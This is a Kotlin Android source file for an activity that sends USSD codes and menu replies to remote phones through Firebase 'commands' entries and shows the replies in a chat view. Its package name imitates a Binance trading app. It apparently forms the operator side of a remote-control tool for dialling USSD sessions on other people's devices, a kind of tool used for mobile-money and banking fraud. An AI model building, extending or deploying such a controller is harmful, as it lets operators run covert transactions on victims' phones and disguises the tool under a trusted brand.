package dApp.binance.Trading.controller

import android.os.Bundle
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase
import android.util.Log

class SendUssdActivity : AppCompatActivity() {

    private lateinit var ussdInput: EditText
    private lateinit var inputValueInput: EditText
    private lateinit var sendCodeButton: Button
    private lateinit var sendButton: Button
    private lateinit var historyButton: Button
    private lateinit var clearButton: Button
    private lateinit var conversationContainer: LinearLayout
    private lateinit var scrollView: ScrollView
    private lateinit var statusText: TextView
    private lateinit var statusIndicator: View
    private lateinit var ussdCodeSection: LinearLayout
    private lateinit var responseInputSection: LinearLayout

    private var deviceId: String = ""
    private var deviceName: String = ""
    private var fcmToken: String = ""
    private var ussdInProgress = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_send_ussd)

        // Initialize views
        ussdInput = findViewById(R.id.ussdInput)
        inputValueInput = findViewById(R.id.inputValueInput)
        sendCodeButton = findViewById(R.id.sendCodeButton)
        sendButton = findViewById(R.id.sendButton)
        historyButton = findViewById(R.id.historyButton)
        clearButton = findViewById(R.id.clearButton)
        conversationContainer = findViewById(R.id.conversationContainer)
        scrollView = findViewById<LinearLayout>(R.id.conversationContainer).parent as ScrollView
        statusText = findViewById(R.id.statusText)
        statusIndicator = findViewById(R.id.statusIndicator)
        ussdCodeSection = findViewById(R.id.ussdCodeSection)
        responseInputSection = findViewById(R.id.responseInputSection)

        deviceId = intent.getStringExtra("device_id") ?: ""
        deviceName = intent.getStringExtra("device_name") ?: ""
        fcmToken = intent.getStringExtra("fcm_token") ?: ""

        title = "💬 $deviceName"

        // Send USSD Code Button
        sendCodeButton.setOnClickListener {
            val ussdCode = ussdInput.text.toString().trim()
            if (ussdCode.isNotEmpty()) {
                sendUssdCode(ussdCode)
                ussdInput.text.clear()
            } else {
                Toast.makeText(this, "Enter USSD code", Toast.LENGTH_SHORT).show()
            }
        }

        // Send Response Button
        sendButton.setOnClickListener {
            val inputValue = inputValueInput.text.toString().trim()
            if (inputValue.isNotEmpty()) {
                sendResponse(inputValue)
                inputValueInput.text.clear()
            } else {
                Toast.makeText(this, "Enter response", Toast.LENGTH_SHORT).show()
            }
        }

        historyButton.setOnClickListener {
            val intent = android.content.Intent(this, ResponseLogActivity::class.java)
            intent.putExtra("device_id", deviceId)
            startActivity(intent)
        }

        clearButton.setOnClickListener {
            conversationContainer.removeAllViews()
            ussdInProgress = false
            ussdCodeSection.visibility = LinearLayout.VISIBLE
            responseInputSection.visibility = LinearLayout.GONE
            updateStatus("Ready to send USSD", "#666666")
        }

        listenForResponses()
    }

    private fun sendUssdCode(code: String) {
        val database = FirebaseDatabase.getInstance().reference

        updateStatus("Sending USSD code...", "#FF9800")
        ussdCodeSection.isEnabled = false
        sendCodeButton.isEnabled = false

        val messageData = mapOf(
            "ussd_code" to code,
            "input_value" to "",
            "is_first_code" to "true",
            "timestamp" to System.currentTimeMillis().toString()
        )

        database.child("commands").child(deviceId).push().setValue(messageData)
            .addOnSuccessListener {
                ussdInProgress = true
                ussdCodeSection.visibility = LinearLayout.GONE
                responseInputSection.visibility = LinearLayout.VISIBLE
                updateStatus("Waiting for USSD response...", "#FF9800")
                addMessageBubble("You", "📞 $code", true)
                Log.d("SendUSSD", "USSD code sent: $code")
            }
            .addOnFailureListener { e ->
                updateStatus("Failed to send USSD", "#F44336")
                sendCodeButton.isEnabled = true
                ussdCodeSection.isEnabled = true
                Toast.makeText(this, "Failed to send: ${e.message}", Toast.LENGTH_SHORT).show()
                Log.e("SendUSSD", "Error sending USSD", e)
            }
    }

    private fun sendResponse(value: String) {
        val database = FirebaseDatabase.getInstance().reference

        updateStatus("Sending response...", "#FF9800")
        sendButton.isEnabled = false

        val messageData = mapOf(
            "ussd_code" to "",
            "input_value" to value,
            "is_response" to "true",
            "timestamp" to System.currentTimeMillis().toString()
        )

        database.child("commands").child(deviceId).push().setValue(messageData)
            .addOnSuccessListener {
                addMessageBubble("You", value, true)
                updateStatus("Waiting for response...", "#FF9800")
                Log.d("SendUSSD", "Response sent: $value")
            }
            .addOnFailureListener { e ->
                updateStatus("Failed to send response", "#F44336")
                sendButton.isEnabled = true
                Toast.makeText(this, "Failed to send: ${e.message}", Toast.LENGTH_SHORT).show()
                Log.e("SendUSSD", "Error sending response", e)
            }
    }

    private fun listenForResponses() {
        val database = FirebaseDatabase.getInstance().reference
        database.child("responses").child(deviceId)
            .addValueEventListener(object : com.google.firebase.database.ValueEventListener {
                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                    snapshot.children.sortedBy { it.key }.lastOrNull()?.let { child ->
                        val response = child.value as? Map<*, *>
                        val responseText = response?.get("response")?.toString() ?: ""
                        val status = response?.get("status")?.toString() ?: "success"
                        val hasInputField = response?.get("has_input_field") as? Boolean ?: false

                        if (responseText.isNotEmpty() && status == "success") {
                            addMessageBubble("$deviceName", responseText, false)
                            updateStatus("Response received", "#4CAF50")
                            sendButton.isEnabled = true

                            if (!hasInputField) {
                                // USSD conversation ended
                                updateStatus("USSD conversation ended", "#666666")
                                sendButton.isEnabled = false
                                responseInputSection.visibility = LinearLayout.GONE
                                ussdCodeSection.visibility = LinearLayout.VISIBLE
                                ussdCodeSection.isEnabled = true
                                sendCodeButton.isEnabled = true
                                ussdInProgress = false
                            }
                        } else if (status == "error") {
                            addMessageBubble("Error", "❌ $responseText", false)
                            updateStatus("Error: $responseText", "#F44336")
                        }
                    }
                }

                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                    updateStatus("Connection error", "#F44336")
                    Log.e("SendUSSD", "Database error", error.toException())
                }
            })
    }

    private fun addMessageBubble(sender: String, message: String, isYou: Boolean) {
        val bubble = LinearLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { setMargins(0, 8, 0, 8) }
            orientation = LinearLayout.VERTICAL
            gravity = if (isYou) android.view.Gravity.END else android.view.Gravity.START
        }

        val messageText = TextView(this).apply {
            text = message
            textSize = 15f
            setPadding(16, 12, 16, 12)
            setTextColor(if (isYou) android.graphics.Color.WHITE else android.graphics.Color.BLACK)
            background = ContextCompat.getDrawable(
                this@SendUssdActivity,
                android.R.drawable.dialog_holo_light_frame
            )
            setBackgroundColor(if (isYou) 0xFF6200EE.toInt() else 0xFFEEEEEE.toInt())
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                maxWidth = (resources.displayMetrics.widthPixels * 0.75).toInt()
            }
        }

        bubble.addView(messageText)
        conversationContainer.addView(bubble)

        // Auto-scroll to bottom
        scrollView.post {
            scrollView.fullScroll(ScrollView.FOCUS_DOWN)
        }
    }

    private fun updateStatus(status: String, color: String) {
        statusText.text = status
        statusIndicator.setBackgroundColor(android.graphics.Color.parseColor(color))
    }
}
